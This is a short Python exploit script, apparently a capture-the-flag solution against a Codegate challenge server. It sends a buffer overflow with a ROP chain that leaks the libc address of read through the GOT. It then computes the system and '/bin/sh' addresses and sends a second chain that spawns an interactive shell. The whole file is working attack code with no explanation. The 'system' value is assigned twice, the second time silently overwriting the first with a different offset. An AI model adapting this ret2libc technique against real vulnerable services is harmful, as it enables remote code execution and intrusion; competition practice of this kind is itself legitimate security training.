import pwnbox, struct
pack = lambda x : struct.pack('<Q',x)
unpack = lambda x : struct.unpack('<Q',x)[0]
p = pwnbox.pipe.SocketPipe('ch41l3ng3s.codegate.kr', 3131)

p.read_until('(1-3)\n')
read_got = 0x602040
write_adr = 0x4006d0
pppr = 0x40087a
buf = 0x602100
read_adr = 0x400700

rop = 'A'*0xb0 + 'B'*8
rop += pack(pppr)
rop += pack(1)
rop += pack(read_got)
rop += pack(8)
rop += pack(write_adr)
rop += pack(pppr)
rop += pack(0)
rop += pack(buf)
rop += pack(0x100)
rop += pack(read_adr)
rop += pack(0x4007e0)
rop += pack(buf)
rop += pack(0x400979)

p.write(rop +'\n')
p.read_until('...:( \n')
libc_read = unpack(p.read(8))
libc = libc_read - 0x00000000000f7250
system = libc + 0x0000000000045390
system = libc+ 0x4526a
binsh = libc + 0x18cd57 

nrop = pack(0x4007e1)*4
nrop += pack(pppr)
nrop += pack(binsh)*3
nrop += pack(system)

p.write(nrop+'\n')
p.interact()
